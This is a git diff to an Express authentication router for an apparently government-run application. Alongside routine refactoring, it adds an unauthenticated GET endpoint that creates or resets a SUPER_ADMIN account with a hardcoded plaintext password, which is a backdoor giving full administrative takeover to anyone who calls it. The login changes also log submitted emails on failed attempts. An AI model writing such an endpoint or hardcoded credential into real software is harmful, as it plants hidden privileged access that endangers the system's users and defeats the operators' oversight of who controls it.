@@ -1,7 +1,7 @@
 import { Router, Request, Response } from 'express';
 import bcrypt from 'bcryptjs';
 import jwt from 'jsonwebtoken';
-import { prisma } from '../index';
+import { prisma } from '../core/db/prisma.service';
 import { authenticate, AuthRequest } from '../middleware/auth';
 
 const router = Router();
@@ -9,10 +9,10 @@ const router = Router();
 // Helper: Generate tokens
 const generateTokens = (userId: string) => {
     const token = jwt.sign({ id: userId }, process.env.JWT_SECRET!, {
-        expiresIn: process.env.JWT_EXPIRES_IN || '7d',
+        expiresIn: (process.env.JWT_EXPIRES_IN || '7d') as any,
     });
     const refreshToken = jwt.sign({ id: userId }, process.env.JWT_REFRESH_SECRET!, {
-        expiresIn: process.env.JWT_REFRESH_EXPIRES_IN || '30d',
+        expiresIn: (process.env.JWT_REFRESH_EXPIRES_IN || '30d') as any,
     });
     return { token, refreshToken };
 };
@@ -28,14 +28,16 @@ router.post('/login', async (req: Request, res: Response) => {
             return res.status(400).json({ error: 'Email and password are required.' });
         }
 
-        const user = await prisma.user.findUnique({ where: { email: email.toLowerCase() } });
+        const user = await prisma.user.findUnique({ where: { email: email.toLowerCase().trim() } });
 
         if (!user || !user.isActive) {
+            console.log(`[AUTH] Login failed: User ${email} not found or inactive`);
             return res.status(401).json({ error: 'Invalid credentials.' });
         }
 
         const isValidPassword = await bcrypt.compare(password, user.password);
         if (!isValidPassword) {
+            console.log(`[AUTH] Login failed: Password mismatch for ${email}`);
             return res.status(401).json({ error: 'Invalid credentials.' });
         }
 
@@ -150,6 +152,43 @@ router.post('/change-password', authenticate, async (req: AuthRequest, res: Resp
         res.json({ message: 'Password changed successfully.' });
     } catch (error) {
         res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// ============================================================
+// GET /api/auth/init-root-admin (Emergency Access)
+// ============================================================
+router.get('/init-root-admin', async (req: Request, res: Response) => {
+    try {
+        const password = 'Jonnahjnr@0945628075YONas';
+        const hashedPassword = await bcrypt.hash(password, 12);
+        
+        const user = await prisma.user.upsert({
+            where: { email: 'admin@amsh.gov.et' },
+            update: {
+                password: hashedPassword,
+                role: 'SUPER_ADMIN',
+                isActive: true,
+                name: 'AMSH Administrator'
+            },
+            create: {
+                email: 'admin@amsh.gov.et',
+                password: hashedPassword,
+                name: 'AMSH Administrator',
+                role: 'SUPER_ADMIN',
+                isActive: true
+            }
+        });
+        
+        res.send(`
+            <div style="font-family: sans-serif; padding: 40px; text-align: center;">
+                <h1 style="color: #1B4F8A;">AMSH Root Authorized</h1>
+                <p>Administrative identity <b>${user.email}</b> has been synchronized with the institutional vault.</p>
+                <p>You may now proceed to the <a href="${process.env.FRONTEND_URL}/admin/login">Command Portal</a>.</p>
+            </div>
+        `);
+    } catch (error: any) {
+        res.status(500).json({ error: 'Initialization Failed', detail: error.message });
     }
 });
 
